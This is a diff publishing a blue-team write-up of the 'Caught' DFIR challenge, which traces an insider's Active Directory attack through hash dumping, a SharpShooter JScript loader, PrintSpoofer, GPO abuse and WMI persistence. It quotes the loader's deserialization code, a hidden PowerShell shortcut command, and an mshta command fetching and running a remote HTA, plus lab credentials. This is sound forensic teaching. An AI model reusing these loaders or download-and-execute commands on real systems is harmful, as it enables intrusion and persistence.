@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Caught - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/Caught.html" />
     <!-- Sherlock-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Caught sherlock - Hard difficulty level">
+    <meta name="description" content="Writeup for Caught sherlock - Hard difficulty level">
     <meta name="keywords" content="Sherlock, Caught, Hard, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
 </head>
 <body>
@@ -64,16 +64,304 @@
         <h1 class="writeup-title">Caught</h1>
         <div class="writeup-metadata">
             <span class="difficulty hard">Hard</span>
-            <span class="date">Active sherlock</span>
+            <span class="date">January 22, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Sherlock-specific content goes here -->
                 <p><img alt="solved" src="../images/Caught/solved.png" /></p>
-<p>Caught is an ACTIVE sherlock!</p>
-<p>This write-up will go live once Caught retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the sherlock is still live.</p>
+<pre class="codehilite"><code>MEGACORP, a leader in tech innovation, recently identified an insider threat: a disgruntled former employee seeking revenge after being fired.
+Despite having been dismissed, he still had access to the company domain through his office credentials, providing him with the means to infiltrate further.
+Leveraging his intimate knowledge of the company's defenses, he skillfully destroyed crucial evidence, anticipating where the DFIR team would look for it.
+However, his meticulous plan had flaws. During the investigation, the DFIR team confiscated his laptop and found fragments of data he had failed to erase.
+Your mission is to analyze these artifacts and piece together the story behind the breach to uncover the details of the attack.
+</code></pre>
+
+<h1>Task 1</h1>
+<p><code>What's the full name of the former employee?</code></p>
+<p>The challenge archive contains 2 zip archives. DC01 and Kali. I'll begin by taking a look at what both of them contain.</p>
+<p><img alt="dc" src="../images/Caught/dc.png" /></p>
+<p>The DC01 directory seems to contain KAPE artifacts. I'm already used to those after doing lots of Windows DFIR sherlocks.</p>
+<p><img alt="kali" src="../images/Caught/kali.png" /></p>
+<p>On the other hand, the kali directory contains recon logs of the attacker and their tools. I'll remember that it contains Bloodhound data as well, as it will help me with timeline reconstruction and piecing together certain events.</p>
+<p>Looking at the users' JSON file, I can tell that there were <code>104</code> users found within the domain.</p>
+<p><code>cat 20241106090408_users.json | jq | grep samaccountname | wc</code></p>
+<p>It would be tedious to look through all of them. I will use <code>jq</code> to list every user's description. Sometimes, imminent changes like account deletion can be noted in the affected user's description by an administrator as a note or a memo.</p>
+<p>Why jq instead of regular grep? Because Bloodhound outputs its findings in a JSON format, using jq will be quicker and will avoid grabbing additional lines with similar matching words.</p>
+<p><code>cat 20241106090408_users.json  | jq '.data[].Properties.description'</code></p>
+<p><img alt="description" src="../images/Caught/description.png" /></p>
+<p>Sweet! Aside from the default domain accounts, every user's description is empty, aside from one. If this were not the case, I would most likely try to correlate user logon time with the attack time, or, if it were a real incident, I would inquire about the data of the fired employee.</p>
+<p>Now, I want to grab the user whose property section contains this description. This can be done quickly with jq by matching the exact phrase with the contents of the description field. Knowing that the other users don't have a description, I could also just search for the word <code>former</code>, but this is a good practice.</p>
+<p><code>cat 20241106090408_users.json  | jq '.data[] | select(.Properties.description == "Former employee – account pending removal.")'</code></p>
+<p><img alt="user" src="../images/Caught/user.png" /></p>
+<p>The employee in question is <code>CONNOR BALL</code></p>
+<p><img alt="task1" src="../images/Caught/task1.png" /></p>
+<h1>Task 2</h1>
+<p><code>What was the former employee's password?</code></p>
+<p>Since I have the KAPE output AND the user's username, this should be fairly straightforward as long as I have the <code>ntds.dit</code> file. This file is an Active Directory database, containing lots of crucial data about users, group policies, and domain settings.</p>
+<p>Most importantly, it is guaranteed to have the most up-to-date user hashes. As long as I have the SYSTEM hive, I will be able to read it with impacket-secretsdump. The SYSTEM hive is necessary because it contains the system's bootkey, which is, in turn, necessary for decrypting the ntds.dit data.</p>
+<p><img alt="dit.png" src="../images/Caught/dit.png" /></p>
+<p>The file is indeed present. I will use secretsdump to dump hashes of all users within the domain.</p>
+<p><code>impacket-secretsdump local -system DC01/C/Windows/System32/config/SYSTEM -ntds "DC01/Active Directory/ntds.dit"</code></p>
+<p><img alt="secretsdump" src="../images/Caught/secretsdump.png" /></p>
+<p><code>cball | aad3b435b51404eeaad3b435b51404ee:384799705d277ba2818dd3ab196a3581</code></p>
+<p>I grepped for Connor's SamAccount name, as finding his hash in this list would be hard to do just like that. That said, now I have his NTLM hash, and I can try cracking it with hashcat.</p>
+<p>(Cue in a 30min adventure because Hashcat kept segfaulting.)</p>
+<p>In the end, I decided to run hashcat on my host.</p>
+<p><img alt="cracked" src="../images/Caught/cracked.png" /></p>
+<p>Connor's password is <code>falloutboy</code></p>
+<p><img alt="task2" src="../images/Caught/task2.png" /></p>
+<h1>Task 3</h1>
+<p><code>How many TCP ports were opened on DC01?</code></p>
+<p>I'll navigate to the <code>results</code> dir, in the same tree where the Bloodhound results were.</p>
+<p>I can see <code>19</code> distinct ports scanned. Running tree on the scan dir will reveal that the attacker has likely used nmap's script engine (NSE) alongside other recon tools to scan every found port.</p>
+<p><img alt="scans" src="../images/Caught/scans.png" /></p>
+<p>Regardless, ths answer is <code>19</code></p>
+<p><img alt="task3" src="../images/Caught/task3.png" /></p>
+<h1>Task 4</h1>
+<p><code>What share was accessible?</code></p>
+<p>Still in the recon dir, I will look at the two ports related to SMB. 139 and 445.</p>
+<p><img alt="share" src="../images/Caught/share.png" /></p>
+<p>I can see two files in the <code>Office share</code>. The .lnk file has a suspicious size, which sets off an alarm in my mind. The .js file is suspicious just by itself, but I'll keep it in mind as well.</p>
+<p><img alt="access" src="../images/Caught/access.png" /></p>
+<p>And here I can see that the attacker had READ/WRITE access to the same share. It is quite possible that these files were planted there by them in order to trick a user into executing a malicious script.</p>
+<p><img alt="task4" src="../images/Caught/task4.png" /></p>
+<h1>Task 5</h1>
+<p><code>The attacker tricked a user into opening a malicious file. What command did the victim unwittingly execute?</code></p>
+<p>Under <code>Caught/kali/exploit</code>, I have a list of files the attacker had prepared for the attack.</p>
+<p><img alt="exploits" src="../images/Caught/exploits.png" /></p>
+<p>The two files found in the share are there, surrounded by a bunch of other no-less suspicious files.</p>
+<p>This .lnk file has such a name that it could trick an innocent user into clicking it. Normally, I would use LECmd from Eric Zimmerman, but I don't really want to switch between my VMs now.</p>
+<p>Instead, I found a Perl script that should do the work.</p>
+<p><a href="https://github.com/lcorbasson/lnk-parse">https://github.com/lcorbasson/lnk-parse</a></p>
+<p><img alt="link" src="../images/Caught/link.png" /></p>
+<p>This shortcut is actually running <code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code> with the arguments <code>-Nop -sta -noni -w hidden wscript.exe MegaCorpServiceWorker.js  C:\Program Files\Windows NT\Accessories\wordpad.exe</code> It's running that .js file from the share!</p>
+<p><img alt="task5" src="../images/Caught/task5.png" /></p>
+<h1>Task 6</h1>
+<p><code>What is the decryption key for the payload?</code></p>
+<p>I will investigate the .js file with Sublime Text.</p>
+<p><img alt="funcs" src="../images/Caught/funcs.png" /></p>
+<p>There are 2 functions. An RC4 decryptor and a base64 decryptor. Alongside that, there is a <code>b64block</code> variable, containing giant amounts of b64-encoded text.</p>
+<p><img alt="bottom" src="../images/Caught/bottom.png" /></p>
+<p>At the bottom, the two functions are used to decode the block, and then decrypt it with RC4, using the <code>wdnpmsiaev</code> key.</p>
+<p><img alt="task6" src="../images/Caught/task6.png" /></p>
+<h1>Task 7</h1>
+<p><code>Which class was used for loading the final shellcode?</code></p>
+<p>I took the .js file and stripped off everything that wasn't the b64block. I saved that under <code>MegaCorpServiceWorker.b64block</code>, and sent it to CyberChef. My intent here is to imitate the decryption operation from the file itself, which is:</p>
+<p><code>Base64 decrypt -&gt; RC4 decrypt with the plain key</code></p>
+<p><img alt="cyberchef" src="../images/Caught/cyberchef.png" /></p>
+<p>This decrypts successfully and reveals actual JavaScript code! The first thing I notice is the <code>setversion</code> function, which sets the COMPLUS_version value to <code>v4.0.30319</code></p>
+<p>The <code>base64ToStream</code> function base64-decrypts given data in memory, the <code>serialized_obj</code> variable is a big mess of b64 data.</p>
+<p><img alt="entryclass" src="../images/Caught/entryclass.png" /></p>
+<p>At the bottom, I finally see some code that will run all the things I saw before, starting off with setting the <code>entry_class</code> to <code>SharpShooter</code>. SharpShooter is a weaponised payload generation framework.</p>
+<p><a href="https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/">https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/</a></p>
+<p><img alt="task7" src="../images/Caught/task7.png" /></p>
+<h1>Task 8</h1>
+<p><code>What was the C2 used?</code></p>
+<p>At this point, I realized that this was not JavaScript, but <code>JScript</code> (these are 2 different languages!). This changes things quite a bit, so I'll go over the functions once again, from top to bottom.</p>
+<pre class="codehilite"><code>function setversion() {
+new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
+}
+</code></pre>
+
+<p>This forces the COM+ version to 4.0.30319, avoiding compatibility issues between different .NET versions.</p>
+<pre class="codehilite"><code>function base64ToStream(b) {
+ var enc = new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;);
+ var length = enc.GetByteCount_2(b);
+ var ba = enc.GetBytes_4(b);
+ var transform = new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;);
+ ba = transform.TransformFinalBlock(ba, 0, length);
+ var ms = new ActiveXObject(&quot;System.IO.MemoryStream&quot;);
+ ms.Write(ba, 0, (length / 4) * 3);
+ ms.Position = 0;
+ return ms;
+}
+</code></pre>
+
+<p>Using .NET tools within JScript, this function takes the b64 chunks and transforms them into raw bytes, which are then loaded into memory with <code>System.IO.MemoryStream</code>. This results in a fileless, memory-only object that will be very hard to detect with normal means.</p>
+<pre class="codehilite"><code>try {
+ setversion();
+ var stm = base64ToStream(serialized_obj);
+ var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+ var al = new ActiveXObject('System.Collections.ArrayList');
+ var n = fmt.SurrogateSelector;
+ var d = fmt.Deserialize_2(stm);
+ al.Add(n);
+ var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
+</code></pre>
+
+<p>In short, this bit is responsible for taking the decoded object and running it in memory. It is much more complex than that, and I'll try to explain it in more detail below.</p>
+<p><code>var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');</code></p>
+<p>The <code>BinaryFormatter</code> tool is used to take an object, save it to a file, and load it back later. However, it has a known flaw that can be abused to achieve code execution.</p>
+<p><code>var al = new ActiveXObject('System.Collections.ArrayList');</code></p>
+<p>This creates a .NET array. My understanding as to why is that JScript is pretty old, and its arrays may be different from modern .NET ones. Later, the attacker will probably want to pass arguments to a .NET function, and this array will be used to hold them.</p>
+<p><code>var n = fmt.SurrogateSelector;</code></p>
+<p>This is supposed to grab <em>something</em> from the fmt object, though I am not quite sure what purpose this line serves.</p>
+<p><code>var d = fmt.Deserialize_2(stm);</code></p>
+<p>Here, the memory stream from <code>stm</code> is read by the formatter. However, <code>d</code> is not just a simple data object at this point.</p>
+<p>Because of the way the object was crafted, <code>d</code> becomes a delegate. A delegate is a pointer to a function like <code>System.Reflection.Assembly.Load</code>, which is capable of loading software into memory.</p>
+<p><code>al.Add(n);</code></p>
+<p>This adds the <em>something</em> from n to the argument array from earlier. It might just be a NULL value used to fulfill an argument amount requirement, or something else. I'm not sure.</p>
+<p><code>var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);</code></p>
+<p>This is the most complex line, but also the most telling. This is what helped me figure out that <code>d</code> is actually a delegate.</p>
+<p>How? The DynamicInvoke method belongs to the <code>System.Delegate</code> class.</p>
+<p><a href="https://learn.microsoft.com/en-us/dotnet/api/system.delegate.dynamicinvoke?view=net-10.0">https://learn.microsoft.com/en-us/dotnet/api/system.delegate.dynamicinvoke?view=net-10.0</a></p>
+<p>The <code>al</code> argument array is passed into that method. At this point, it contains only the value of <code>n</code></p>
+<p>Essentially, it is executing the function <code>d</code> with an argument of <code>n</code>. I'm leaning towards <code>n</code> being empty/NULL, which could mean that <code>d</code> already contains malicious code, and just requires <em>an argument</em> to run its functions.</p>
+<p>The result of d.DynamicInvoke is then taken, and <code>CreateInstance</code> is run against it, searching for the SharpShooter class within the loaded object, which is most definitely a DLL, taking in everything I know about it so far.</p>
+<p>After all this, o becomes a live, instantiated object of that class, ready to execute commands defined within the malicious DLL.</p>
+<hr />
+<p>After the try{} block, the <code>sc</code> variable is defined. It contains yet another b64 blob, and the name <code>sc</code> could expand to <code>shellcode</code>. The mentioned class could possess the functionality necessary to process this string and execute the shellcode in memory.</p>
+<p>I saved the code into a file with CyberChef, and deleted everything besides the sc variable. I then decoded it from b64 and saved it into a separate file, which I then sent to VirusTotal for scanning.</p>
+<p><img alt="vt" src="../images/Caught/vt.png" /></p>
+<p>Certain AVs flag this shellcode as related to Sliver. Many commenters have also done the same, which makes me certain that this is, in fact, Sliver C2 shellcode.</p>
+<p>The last thing this script does is pass the shellcode into a custom <code>Go</code> function within the loaded DLL. It is most likely responsible for executing the shellcode in memory.</p>
+<p><img alt="task8" src="../images/Caught/task8.png" /></p>
+<h1>Task 9</h1>
+<p><code>The attacker used a well-known tool to escalate their privileges. Which Windows privilege does this tool exploit?</code></p>
+<p>Looking at the attacker's exploit list, I can identify 2 well-known tools. Mimikatz and PrintSpoofer.</p>
+<p>Mimikatz doesn't have a single specific privilege that it exploits, while PrintSpoofer exploits <code>SeImpersonatePrivilege</code> specifically. If I did not know this, I would look into the PrintSpoofed GitHub page, and it would become clear quickly.</p>
+<p><a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></p>
+<p><img alt="task9" src="../images/Caught/task9.png" /></p>
+<h1>Task 10</h1>
+<p><code>What are the arguments used to gain full NT Authority System?</code></p>
+<p>The attacker tried to clear their tracks, and this proved to be a nuisance, especially here. My usual methods of tracking command execution (event logs, PowerShell history, etc) returned nothing.</p>
+<p>Having the attacker's tooling, I suspected it must've been either involving one of <code>MegaCorpSync.bin  MegaCorpSync.exe  MegaCorpUpdater.msi</code>, or just running a reverse shell.</p>
+<p>Out of ideas, I ran strings against these 3 files, and found something I did not expect.</p>
+<p><img alt="unexpected" src="../images/Caught/unexpected.png" /></p>
+<p>MegaCorpSync.bin contains an argument of <code>-c c:\windows\tasks\MegaCorpSync.exe</code>, which looks suspiciously compatible with PrintSpoofer.</p>
+<p><img alt="task10" src="../images/Caught/task10.png" /></p>
+<h1>Task 11</h1>
+<p><code>What is the name of the Git repository the attacker used to generate MegaCorpSync.exe?</code></p>
+<p>While running strings against the 3 files earlier, I also found an interesting path within MegaCorpSync.exe.</p>
+<p><img alt="path" src="../images/Caught/path.png" /></p>
+<p><code>C:\Users\jigsaw\Source\Repos\OSEP-Code-Snippets\Shellcode Process Hollowing\obj\x64\Release\Shellcode Process Hollowing.pdb</code></p>
+<p>This is just a .pdb file path, but the <code>Repos</code> directory contains the <code>OSEP-Code-Snippets</code>, meaning it is a repository. A .pdb file is created during compilation, and its path can reveal a bunch of interesting information, like the author's username, the directory path of the executable, and the project directory tree.</p>
+<p><img alt="task11" src="../images/Caught/task11.png" /></p>
+<h1>Task 12</h1>
+<p><code>What is the host name of the workstation that has been compromised?</code></p>
+<p>In the attacker's loot directory, I can see a <code>mimikatz.log</code> file.</p>
+<p><img alt="mimikatz1" src="../images/Caught/mimikatz1.png" /></p>
+<p>The attacker confirms their privileges (SeDebugPriv means that they were running as SYSTEM at this point), and dumps authentication secrets from lsass.exe.</p>
+<p><code>osmith | ee57a7abe466312ffdd98e4041f37253</code></p>
+<p>Aside from osmith, the attacker also found a different pair of credentials.</p>
+<p><img alt="mimikatz2" src="../images/Caught/mimikatz2.png" /></p>
+<p><code>mtucker | LUmRfx9h22jhpEj</code></p>
+<p>Not only that, but they have also found credentials for the compromised machine's account as well.</p>
+<p><img alt="mimikatz3" src="../images/Caught/mimikatz3.png" /></p>
+<p><code>WS01$ | b0997a1b9786ebdc8e68af4086ed20eb</code></p>
+<p><img alt="task12" src="../images/Caught/task12.png" /></p>
+<h1>Task 13</h1>
+<p><code>What was the SAM Account Name of the user that was compromised?</code></p>
+<p>This has been answered while solving task 12. The answer is <code>osmith</code></p>
+<p><img alt="task13" src="../images/Caught/task13.png" /></p>
+<h1>Task 14</h1>
+<p><code>What were the plaintext user's credentials that were cached on the compromised workstation?</code></p>
+<p>This has also been answered while solving task 12, and the answer is <code>mtucker:LUmRfx9h22jhpEj</code></p>
+<p><img alt="task14" src="../images/Caught/task14.png" /></p>
+<h1>Task 15</h1>
+<p><code>To which group did the previous user initially belong?</code></p>
+<p>This information is stored in the Active Directory database I've talked about before, ntds.dit. I'll use <code>ntdissector</code> to get readable data out of this file.</p>
+<p><a href="https://github.com/synacktiv/ntdissector">https://github.com/synacktiv/ntdissector</a></p>
+<p><img alt="ntdissector" src="../images/Caught/ntdissector.png" /></p>
+<p>The group and user data has been picked out into JSON files, making looking through them nice and easy. Since I know the sAMAccountName of that user, I will use it to find that user object.</p>
+<p><code>cat ntdsout/out/e2d9644a8d5f3b1bf4f23bb3ade4a260/user.json | jq 'select(.sAMAccountName == "mtucker")'</code></p>
+<p><img alt="mgroups" src="../images/Caught/mgroups.png" /></p>
+<p>Molly is a member of 3 groups... However, this data is from AFTER the attacker had modified the domain. Some of these groups did not contain Molly originally, and I can find out which by looking at the BloodHound output from the attacker's recon directory.</p>
+<p>I'm going to grab Molly's SID <code>S-1-5-21-3335886548-1976288829-1586005320-1612</code>, as BloodHound's <code>groups.json</code> lists group members by SIDs, not by samaccountname.</p>
+<p><code>cat kali/recon/bloodhound/20241106090408_groups.json | jq '.data[] | select(.Members[]?.ObjectIdentifier == "S-1-5-21-3335886548-1976288829-1586005320-1612")'</code></p>
+<p><img alt="developers" src="../images/Caught/developers.png" /></p>
+<p>The only result is the developers group. The remaining two were a result of the attacker's actions.</p>
+<p><img alt="task15" src="../images/Caught/task15.png" /></p>
+<h1>Task 16</h1>
+<p><code>Which privilege enabled the attacker to pivot to another group? (Format: AD object,privilege,AD object - AD objects must be inserted without the @domain)</code></p>
+<p>I'll take the developers group SID, and I'll look through every group's ACE list to find groups over which developers have rights.</p>
+<p><code>cat kali/recon/bloodhound/20241106090408_groups.json | jq '.data[] | select(.Aces[]?.PrincipalSID == "S-1-5-21-3335886548-1976288829-1586005320-1603")'</code></p>
+<p><img alt="engineers" src="../images/Caught/engineers.png" /></p>
+<p>The only entry is the engineers group. Developers have <code>GenericAll</code> rights over engineers.</p>
+<p><img alt="rights" src="../images/Caught/rights.png" /></p>
+<p><img alt="task16" src="../images/Caught/task16.png" /></p>
+<h1>Task 17</h1>
+<p><code>To which groups does the previous user currently belong? (Sort them alphabetically and separate them with a comma)</code></p>
+<p>I already saw the 3 groups while looking through the ntdissector output in task 15. The answer is <code>Administrators,Developers,Engineers</code></p>
+<p><img alt="task17" src="../images/Caught/task17.png" /></p>
+<h1>Task 18</h1>
+<p><code>Which privilege enabled the attacker to gain Local Admin? (Format: AD object,privilege,AD object - AD objects must be inserted without the @domain)</code></p>
+<p>Just like before, I grabbed the group SID to find what its members can do.</p>
+<p><code>cat kali/recon/bloodhound/* | jq '.data[] | select(.Aces[]?.PrincipalSID == "S-1-5-21-3335886548-1976288829-1586005320-1602")'</code></p>
+<p><img alt="policy" src="../images/Caught/policy.png" /></p>
+<p>Members of the engineers group have GenericWrite over the MEGAPOLICY. I took its ObjectIdentifier to check where it applies.</p>
+<p><img alt="domain" src="../images/Caught/domain.png" /></p>
+<p>There is only this one domain in the domains.json. Looking at the links array, I see a familiar-looking value.</p>
+<p><img alt="links" src="../images/Caught/links.png" /></p>
+<p>The GUID of the first link corresponds to the MEGAPOLICY. Because it is linked to the domain itself AND is enforced, it will apply to every user and every computer within the domain, no exceptions. This gives the attacker control over the entire domain, as they can create schtasks as system, create users, or add existing ones to local administrators on workstations OR the DC itself.</p>
+<p><img alt="task18" src="../images/Caught/task18.png" /></p>
+<h1>Task 19</h1>
+<p><code>What is the full path of the tool that was used to gain Local Admin?</code></p>
+<p>Knowing that the attacker abused this GPO for privesc to LA, I am confident that the tool they used is <code>SharpGPOAbuse.exe</code></p>
+<p>To find out where they had dropped this file on the filesystem, I will look through the $MFT journal with MFTECmd.</p>
+<p><img alt="mft" src="../images/Caught/mft.png" /></p>
+<p>The full path will be <code>C:\Windows\Tasks\SharpGPOAbuse.exe</code></p>
+<p><img alt="task19" src="../images/Caught/task19.png" /></p>
+<h1>Task 20</h1>
+<p><code>What is the full name of the new user added?</code></p>
+<p>I will compare both user.json files to see which user has been added. That user <em>will</em> be present in the ntds users, but <em>will no</em> be present in the BloodHound output.</p>
+<pre class="codehilite"><code>cat ntdsout/out/e2d9644a8d5f3b1bf4f23bb3ade4a260/user.json | jq | grep sAMAccountName | awk -F'&quot;' '{print $4}' &gt; ndtsusers
+
+cat kali/recon/bloodhound/20241106090408_users.json | jq | grep samaccountname | awk -F'&quot;' '{print $4}' '&gt; bhoundusers
+</code></pre>
+
+<p>Having both of these lists, I will compare them with diff to see the differences.</p>
+<p><img alt="fake" src="../images/Caught/fake.png" /></p>
+<p>However, there are a lot of "false positives". This is because the files have users listed in a different order. To fix this, I can sort the files before comparing them, which should make them identical, save for the user I'm looking for.</p>
+<p><code>diff &lt;(sort ndtsusers) &lt;(sort bhoundusers)</code></p>
+<p><img alt="rooi" src="../images/Caught/rooi.png" /></p>
+<p>A user with the samaccount name of <code>rooi</code> exists in the ntds.dit file, but it does not exist in the BH output. This is the attacker-added user, and to get their full name, I will look for them in users.json.</p>
+<p><code>cat ntdsout/out/e2d9644a8d5f3b1bf4f23bb3ade4a260/user.json | jq 'select(.sAMAccountName == "rooi")'</code></p>
+<p><img alt="added" src="../images/Caught/added.png" /></p>
+<p><code>Robbin Ooi</code> is the attacker-added user.</p>
+<p><img alt="task20" src="../images/Caught/task20.png" /></p>
+<h1>Task 21</h1>
+<p><code>What was the name of the object set for persistence?</code></p>
+<p>This and the next task took me a good while to figure out, as I've never encountered this persistence mechanic before!</p>
+<p>I looked for clues related to known persistence options like schtasks, autostart directory, and logon scripts, and found nothing. After that, I found a peculiar directory that I didn't pay much attention to beforehand.</p>
+<p><img alt="wbem" src="../images/Caught/wbem.png" /></p>
+<p>This is a WMI (Windows Management Instrumentation) repository, also known as the CIM (Common Information Model) Repository. It is a central database that stores definitions, meta-information, and some static data for WMI classes, which Windows and third-party applications use to manage and monitor system components.</p>
+<p>Attackers often use WMI to establish persistence by creating Event Filters and Event Consumers. These allow malicious scripts to run automatically when certain system events occur (e.g., at a specific time or when a user logs in).</p>
+<p>I will use the <code>flare-wmi</code> repo to look through this WMI repository.</p>
+<p><a href="https://github.com/mandiant/flare-wmi/tree/master">https://github.com/mandiant/flare-wmi/tree/master</a></p>
+<p><img alt="samples" src="../images/Caught/samples.png" /></p>
+<p>I'll start by running timeline.py to get a look at all the existing classes.</p>
+<p><code>python flare-wmi/python-cim/samples/timeline.py DC01/C/Windows/System32/wbem/Repository/</code></p>
+<p><img alt="backup" src="../images/Caught/backup.png" /></p>
+<p>This <code>RegistryBackup</code> class looks out of place, and its timestamp matches the day of the attack. I'll have a closer look at it.</p>
+<p><code>python flare-wmi/python-cim/samples/dump_class_definition.py win7 DC01/C/Windows/System32/wbem/Repository/ root\\cimv2 RegistryBackup</code></p>
+<p><img alt="class" src="../images/Caught/class.png" /></p>
+<p>The data key contains a long, hex-like string. I'll decode it with xxd.</p>
+<p><img alt="base64" src="../images/Caught/base64.png" /></p>
+<p>This uncovers a base64 string, which looks very suspicious to me. I'll pipe this to base64 -d to see the final string.</p>
+<p><img alt="payload" src="../images/Caught/payload.png" /></p>
+<p><code>cmd /c 'mshta http://45.123.76.89/MEGACORP_DataSync.hta</code></p>
+<p><img alt="task21" src="../images/Caught/task21.png" /></p>
+<h1>Task 22</h1>
+<p><code>What was the payload set for persistence?</code></p>
+<p>I already know the payload, so I'll take this opportunity to analyze it a bit more.</p>
+<p>Mshta is a LOLBAS capable of downloading files from the internet, not necessarily limited to .hta files. It uses the same engine as Internet Explorer but runs as a fully trusted application outside of the browser sandbox. This means it can modify registry keys, files, and system resources without warning the user.</p>
+<p>This command will not leave a trace on disk. The .hta file will be executed by mshta in memory, never written onto the disk.</p>
+<p>A .hta file (HTML Application) is essentially a hybrid between a webpage and a desktop application. It contains both HTML/CSS and VBScript/JScript, serving as a potent weapon for an attacker.</p>
+<p><a href="https://en.wikipedia.org/wiki/HTML_Application">https://en.wikipedia.org/wiki/HTML_Application</a></p>
+<p><img alt="task22" src="../images/Caught/task22.png" /></p>
+<p>Solved!</p>
+<h1>BONUS: Alternate way of finding Task22 answer</h1>
+<p>During my initial solve, I somehow missed the possibility of dumping the class directly. As a result, I thought that the attacker had cleaned up this as well as they have been pretty diligent, and looked for ways to look through unallocated/deleted data.</p>
+<p><code>python flare-wmi/python-cim/samples/find_bytes.py DC01/C/Windows/System32/wbem/Repository RegistryBackup</code></p>
+<p><img alt="page" src="../images/Caught/page.png" /></p>
+<p>It found my needle <code>RegistryBackup</code> on physical page <code>0x568</code> offset <code>0x1ead</code>. This data is probably living inside the Index B-Trees or the mapping files of the WMI repository.</p>
+<p>With the page number, I can use <code>dump_pages.py</code> to dump the entire page.</p>
+<p><code>python flare-wmi/python-cim/samples/dump_page.py DC01/C/Windows/System32/wbem/Repository 0x568</code></p>
+<p><img alt="string" src="../images/Caught/string.png" /></p>
+<p>And here's the very same base64 string! This is how I found the answer while solving the challenge for the first time.</p>
             </div>
             
             <div class="toc-sidebar">
@@ -92,7 +380,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
